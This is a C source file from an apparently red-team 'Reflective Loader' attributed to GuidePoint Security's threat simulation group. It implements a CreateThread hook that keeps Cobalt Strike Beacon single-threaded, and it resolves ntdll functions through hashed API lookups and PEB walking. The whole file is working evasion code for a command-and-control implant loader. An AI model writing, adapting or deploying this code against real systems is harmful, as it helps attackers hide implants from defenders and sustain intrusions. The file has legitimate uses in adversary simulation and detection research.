/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( NtQueryVirtualMemory );
	D_API( RtlCreateUserThread );
} API ;

/* API Hashes */
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_RTLCREATEUSERTHREAD	0x6c827322 /* RtlCreateUserThread */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Prevents Cobalt Strike from spawning a new thread
 * if it is within its current address space, to make
 * Beacon single-threaded.
 *
!*/
D_SEC( D ) HANDLE WINAPI CreateThread_Hook( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, PTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
{
	API				Api;
	CLIENT_ID			Cid;
	MEMORY_BASIC_INFORMATION	Mb1;
	MEMORY_BASIC_INFORMATION	Mb2;

	BOOLEAN				Sus = FALSE;
	NTSTATUS			Nst = STATUS_UNSUCCESSFUL;

	HANDLE				Thd = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.NtQueryVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.RtlCreateUserThread   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );

	/* Query the MemoryBasicInformation of the passed in parameter */
	if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), lpStartAddress, MemoryBasicInformation, &Mb1, sizeof( Mb1 ), NULL ) ) ) {
		/* Query the MemoryBasicInformation of our current function */
		if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_SYM( CreateThread_Hook ) ), MemoryBasicInformation, &Mb2, sizeof( Mb2 ), NULL ) ) ) {
			/* Does not come from the same base allocation? */
			if ( C_PTR( Mb1.AllocationBase ) != C_PTR( Mb2.AllocationBase ) ) 
			{ 
				/* Do we suspend? */
				if ( dwCreationFlags & CREATE_SUSPENDED ) 
				{
					/* Yes we suspended */
					Sus = TRUE;
				} else 
				{
					/* No we do not! */
					Sus = FALSE;
				};
				/* Create the new thread pointing at our target region */
				if ( NT_SUCCESS( ( Nst = Api.RtlCreateUserThread( NtCurrentProcess(), lpThreadAttributes, Sus, 0, dwStackSize, dwStackSize, lpStartAddress, lpParameter, &Thd, &Cid ) ) ) ) 
				{
					/* Do we need the thread ID? */
					if ( lpThreadId != NULL ) 
					{
						/* Set the return ID */
						*lpThreadId = Cid.UniqueThread;
					};
				};
			} else {
				/* Notify that we cannot create this thread! */
				Nst = STATUS_ACCESS_DENIED;
			};
		};
	};
	/* Set the last error information */
	Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Mb1, sizeof( Mb1 ) );
	RtlSecureZeroMemory( &Mb2, sizeof( Mb2 ) );

	/* Return */
	return C_PTR( Thd );
};
